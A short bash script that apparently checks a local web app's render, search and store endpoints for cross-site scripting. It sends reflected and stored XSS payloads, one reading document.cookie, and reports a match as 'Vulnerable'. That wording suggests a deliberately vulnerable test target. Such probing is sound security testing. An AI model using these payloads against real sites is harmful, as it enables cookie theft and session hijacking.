#!/bin/bash
# Web render validation script

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Web Render Validation Script${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

test_case() {
    local name="$1"
    local url="$2"
    local pattern="$3"
    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[Test $TOTAL]${NC} $name"
    echo "URL: $url"

    response=$(curl -s "$url" 2>/dev/null)
    if echo "$response" | grep -qiE "$pattern"; then
        echo -e "  ${GREEN}[✓] Vulnerable${NC}"
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] Test failed${NC}"
        FAILED=$((FAILED + 1))
    fi
}

echo -e "${BLUE}=== Web Render Tests ===${NC}"

test_case "Reflected XSS" \
    "${BASE_URL}/api/v1/web/render?content=%3Cscript%3Ealert(1)%3C/script%3E" \
    "<script>alert"

test_case "Search XSS" \
    "${BASE_URL}/api/v1/web/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E" \
    "<img|alert"

test_case "Stored XSS" \
    "${BASE_URL}/api/v1/web/store?data=%3Cscript%3Ealert(document.cookie)%3C/script%3E" \
    "script|cookie"

test_case "Show XSS" \
    "${BASE_URL}/api/v1/web/show" \
    "script|cookie|alert"

# Summary
echo -e "\n${BLUE}========================================${NC}"
echo "Total tests: ${YELLOW}$TOTAL${NC}"
echo "Passed: ${GREEN}$PASSED${NC}"
echo "Failed: ${RED}$FAILED${NC}"
